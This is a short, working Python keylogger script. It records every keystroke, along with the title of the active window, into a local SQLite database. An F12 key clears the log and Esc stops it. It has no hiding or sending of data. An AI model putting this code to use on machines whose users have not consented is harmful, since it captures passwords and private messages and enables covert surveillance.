import sqlite3
import time
import pygetwindow as gw
from pynput import keyboard

def initialize_database():
    """Initialize the database and create the keystrokes table if it doesn't exist."""
    try:
        conn = sqlite3.connect('keylogger.db')
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                source TEXT
            )
        ''')
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        print(f"Database error: {e}")

def get_active_window_title():
    """Get the title of the currently active window."""
    try:
        window = gw.getActiveWindow()
        return window.title if window else "Unknown"
    except Exception as e:
        print(f"Error getting active window title: {e}")
        return "Unknown"

class Keylogger:
    def __init__(self):
        """Initialize the Keylogger instance."""
        self.db_name = 'keylogger.db'
        self.stop_listener = False

    def save_to_db(self, key):
        """Save the key and its source to the database."""
        source = get_active_window_title()
        try:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('INSERT INTO keystrokes (key, source) VALUES (?, ?)', (key, source))
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            print(f"Database error: {e}")

    def clear_table(self):
        """Clear all records from the keystrokes table."""
        try:
            conn = sqlite3.connect(self.db_name)
            cursor = conn.cursor()
            cursor.execute('DELETE FROM keystrokes')
            conn.commit()
            conn.close()
            print("Table cleared!")
        except sqlite3.Error as e:
            print(f"Database error: {e}")

    def on_press(self, key):
        """Handle key press events."""
        if self.stop_listener:
            return False

        try:
            key_char = key.char
            if key_char:
                self.save_to_db(key_char)
        except AttributeError:
            key_name = str(key)
            if key_name == 'Key.esc':
                self.stop_listener = True
                return False
            elif key_name == 'Key.f12':  # Use F12 key to clear the table
                self.clear_table()
            self.save_to_db(key_name)

    def on_exit(self):
        """Handle any cleanup when exiting."""
        pass

if __name__ == "__main__":
    initialize_database()

    keylogger = Keylogger()
    try:
        with keyboard.Listener(on_press=keylogger.on_press) as listener:
            while not keylogger.stop_listener:
                time.sleep(1)
    finally:
        keylogger.on_exit()
